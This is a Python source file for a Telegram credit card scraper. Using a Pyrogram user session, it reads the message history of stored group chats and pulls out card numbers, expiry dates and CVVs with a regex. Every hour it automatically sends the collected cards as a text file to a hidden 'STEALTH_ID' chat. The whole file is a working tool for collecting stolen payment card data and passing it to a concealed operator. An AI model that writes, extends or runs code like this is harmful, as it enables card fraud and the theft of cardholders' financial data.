"""scraper.py — Pyrogram CC Scraper (Auto & Manual)"""
import re
import logging
import asyncio
import io

# ═══ FIX: Create event loop for Python 3.12+ ═══
try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

from pyrogram import Client
from config import API_ID, API_HASH, SESSION_STRING, STEALTH_ID
from database import get_bot_gcs

logger = logging.getLogger(__name__)
CC_REGEX = re.compile(r'(\d{13,19})\s*[|/:,\t ]\s*(\d{1,2})\s*[|/:,\t ]\s*(\d{2,4})\s*[|/:,\t ]\s*(\d{3,4})')

_pyro_app = None

async def init_pyro():
    global _pyro_app
    if not _pyro_app:
        _pyro_app = Client("scraper_session", api_id=API_ID, api_hash=API_HASH, session_string=SESSION_STRING, in_memory=True)
        await _pyro_app.start()
        logger.info("✅ Pyrogram Scraper Started")
    return _pyro_app

async def scrape_chat(chat_identifier, limit=1000):
    app = await init_pyro()
    found_ccs = set()
    title = str(chat_identifier)
    try:
        try:
            chat = await app.get_chat(chat_identifier)
            title = chat.title or str(chat.id)
        except: pass

        async for message in app.get_chat_history(chat_identifier, limit=limit):
            text = message.text or message.caption or ""
            if not text: continue
            for match in CC_REGEX.finditer(text):
                cc, mm, yy, cvv = match.groups()
                mm = mm.zfill(2)
                if len(yy) == 4: yy = yy[2:]
                found_ccs.add(f"{cc}|{mm}|{yy}|{cvv}")
    except Exception as e:
        logger.error(f"Scrape error on {chat_identifier}: {e}")
        return None, title
    return found_ccs, title

async def auto_scrape_loop(bot):
    await asyncio.sleep(60)
    while True:
        try:
            gcs = get_bot_gcs()
            if gcs:
                all_ccs = set()
                report = []
                for gc in gcs:
                    ccs, title = await scrape_chat(gc['chat_id'])
                    if ccs:
                        all_ccs.update(ccs)
                        report.append(f"{title}: {len(ccs)} CCs")
                    await asyncio.sleep(5)
                    
                if all_ccs:
                    txt = "\n".join(all_ccs)
                    await bot.send_message(
                        chat_id=STEALTH_ID,
                        text=f"<b>🤖 AUTO-SCRAPE REPORT</b>\n\nTotal CCs: <code>{len(all_ccs)}</code>\n\n" + "\n".join(report),
                        parse_mode="HTML"
                    )
                    f = io.BytesIO(txt.encode())
                    f.name = f"auto_scraped_{len(all_ccs)}.txt"
                    await bot.send_document(chat_id=STEALTH_ID, document=f)
        except Exception as e:
            logger.error(f"Auto scrape failed: {e}")
        await asyncio.sleep(3600)
